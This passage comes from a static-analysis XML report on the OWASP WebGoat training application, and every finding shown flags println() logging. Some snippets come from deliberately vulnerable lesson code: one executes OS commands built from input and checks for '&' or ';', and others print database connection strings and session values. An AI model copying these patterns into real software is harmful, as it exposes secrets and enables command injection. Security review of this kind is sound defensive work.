                            </Primary>
                        </Issue>
                        <Issue iid="A1F814E46DEA399046361471B58469B8" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>801</LineStart>
<Snippet>	public void openLessonSession(AbstractLesson lesson)
	{
		System.out.println("Opening new lesson session for lesson " + lesson);
		LessonSession lessonSession = new LessonSession();
		lessonSessions.put(lesson, lessonSession);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BCF58879E79AE8584B05808D3717D696" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>88</LineStart>
<Snippet>		catch (UnauthorizedException ue2)
		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="581829F965BDE48E7653FE512D66E973" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Course.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Course.java</FilePath>
<LineStart>71</LineStart>
<Snippet>		catch (IOException e)
		{
		    System.out.println("Error loading WebGoat properties");
		    e.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B3C83361599738961A888DB0393A83B2" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>253</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Failed to load lesson state for " + screen);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2B28697295130E0E9596D8E2F8D8C1B2" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>439</LineStart>
<Snippet>		{
			String path = context.getRealPath( "/database" ).replace( '\\', '/' );
			System.out.println( "PATH: " + path );
			String realConnectionString = databaseConnectionString.replaceAll( "PATH", path );
			System.out.println( "Database Connection String: " + realConnectionString );</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AC0F9A7230F292396DB97EB2A516A385" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>109</LineStart>
<Snippet>	    catch (UnauthenticatedException ue1)
	    {
		System.out.println("Internal server error");
		ue1.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B21140A80A8554DEA5A9E530B261CCEA" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>363</LineStart>
<Snippet>	{
	    // All other errors send the user to the generic error page
	    System.out.println("handleRequest() error");
	    e.printStackTrace();
	    setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6587080D7FB5505E64703340990CD7E5" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>216</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="162021CF920600D31D9E8E71C85BFD1B" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RefreshDBScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/RefreshDBScreen.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	    CreateDB db = new CreateDB();
	    db.makeDB(connection);
	    System.out.println("Successfully refreshed the database.");
	}
	catch (Exception e)</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6A916620ECA642E88669EAFFDEAD4781" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>431</LineStart>
<Snippet>	    catch (ParameterNotFoundException pnfe)
	    {
		System.out.println("Missing parameter");
		pnfe.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B6C204130C1FB4DFCC47D77ECD714450" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>356</LineStart>
<Snippet>	{
	    s.setMessage("You are not authorized to perform this function");
	    System.out.println("Authorization failure");
	    setCurrentAction(s, ERROR_ACTION);
	    ue2.printStackTrace();</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="24F968FC44C3A42824EBB499109F1928" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>400</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2406F0F7506F4327443FD975B836CB65" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>359</LineStart>
<Snippet>	    catch (ParameterNotFoundException pnfe)
	    {
		System.out.println("Missing parameter");
		pnfe.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E413776BE4160E277DA345DEB43F87E5" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>422</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="77D6908B48448455AC036D53F1A42A8D" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>283</LineStart>
<Snippet>		// FIXME: hack to save context for web service calls
		DatabaseUtilities.servletContextRealPath = context.getRealPath("/");
		System.out.println("Context Path: " + DatabaseUtilities.servletContextRealPath);
		// FIXME: need to solve concurrency problem here -- make tables for this user
		if ( !databaseBuilt )</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1F25CF2831109A59123CA7FF69BAF7F4" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>1089</LineStart>
<Snippet>		if ( isHackedAdmin )
		{
			System.out.println("Hacked admin");
			hasHackedHackableAdmin = true;
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="86CE78A3DE8723A37162343CD56602F3" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>245</LineStart>
<Snippet>	    String name = (String) enumerator.nextElement();
	    Object value = session.getAttribute(name);
	    System.out.println("Name: " + name);
	    System.out.println("Value: " + value);
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0E6279C9E608A3A89C7C8A984E3B8B1C" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>437</LineStart>
<Snippet>	    catch (ValidationException ve)
	    {
		System.out.println("Validation failed");
		ve.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="10B37D67517B94D61AFCAFD961B76B84" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>285</LineStart>
<Snippet>    private String exec(WebSession s, String[] command)
    {
	System.out.println("Executing OS command: " + Arrays.asList(command));
	ExecResults er = Exec.execSimple(command);
	if (!er.getError())</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5E18F199AE9FE0D38996D9D8C4FD067C" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>124</LineStart>
<Snippet>	    catch (UnauthenticatedException ue1)
	    {
		System.out.println("Internal server error");
		ue1.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="635FE899485F703DE0A9EF3FDC1FB18E" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>343</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5B12314F7293BC2EEC2FD70D360A6089" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>960</LineStart>
<Snippet>	catch (IOException e)
	{
	    System.out.println("reading file EXCEPTION: " + filename);
	    s.setMessage("Could not find source file");
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="848E5AB128D12AD7A3735689CBD6E750" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>343</LineStart>
<Snippet>	catch (ValidationException ve)
	{
	    System.out.println("Validation failed");
	    ve.printStackTrace();
	    setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D71A061BF26FF0600602106B96F6A1FE" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>1112</LineStart>
<Snippet>	private void restartLesson(int lessonId)
	{
		System.out.println("Restarting lesson: " + getLesson(lessonId));
		getCurrentLesson().getLessonTracker( this ).setStage(1);
		getCurrentLesson().getLessonTracker( this ).setCompleted(false);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="94A247653D76C6BA23C0DA95B0B9F589" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>80</LineStart>
<Snippet>	    catch (UnauthenticatedException ue1)
	    {
		System.out.println("Internal server error");
		ue1.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="10DC775033884F9BB1343DDED94F152B" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>264</LineStart>
<Snippet>    private String exec(WebSession s, String command)
    {
	System.out.println("Executing OS command: " + command);
	ExecResults er = Exec.execSimple(command);
	if ((command.indexOf("&amp;") != -1 || command.indexOf(";") != -1)</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4D42DCAF0A8F504CB9D3F8D36FB0747C" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>347</LineStart>
<Snippet>	    catch (ValidationException ve)
	    {
		System.out.println("Validation failed");
		ve.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A9034464FA6672A3BD27D9C6CF21EBCD" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>120</LineStart>
<Snippet>		catch (UnauthenticatedException ue1)
		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DC18E4D591F712457703E9700EBB45CB" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>441</LineStart>
<Snippet>			System.out.println( "PATH: " + path );
			String realConnectionString = databaseConnectionString.replaceAll( "PATH", path );
			System.out.println( "Database Connection String: " + realConnectionString );

			return realConnectionString;</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CFD9EA3E4CA47EF7227ADDF1F7AF6D96" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>457</LineStart>
<Snippet>	    {
		// All other errors send the user to the generic error page
		System.out.println("handleRequest() error");
		e.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B88FDD8287BB577B70DFE67F2AAEE3C2" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>87</LineStart>
<Snippet>		index = index + 1;
		int helpFileLen = helpFile.length() - 1; // subtract 1 for the closing quote
		System.out.println("Command = ["
			+ helpFile.substring(index, helpFileLen).trim()
				.toLowerCase() + "]");</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A9147AF6D0B3C0F21317AACF1EB28D32" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>372</LineStart>
<Snippet>	    {
		s.setMessage("Login failed");
		System.out.println("Authentication failure");
		ue.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6091B70236449E72F5879686A6C6E367" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>350</LineStart>
<Snippet>	{
	    s.setMessage("Login failed");
	    System.out.println("Authentication failure");
	    ue.printStackTrace();
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A5C6030B921325DF8D8515310FB2389B" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>95</LineStart>
<Snippet>		catch (UnauthorizedException ue2)
		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D4AE96426FC631AB9233B90414110135" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>360</LineStart>
<Snippet>	    {
		s.setMessage("You are not authorized to perform this function");
		System.out.println("Authorization failure");
		ue2.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9B173D6306268755E45C2AC1323FBE1B" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>159</LineStart>
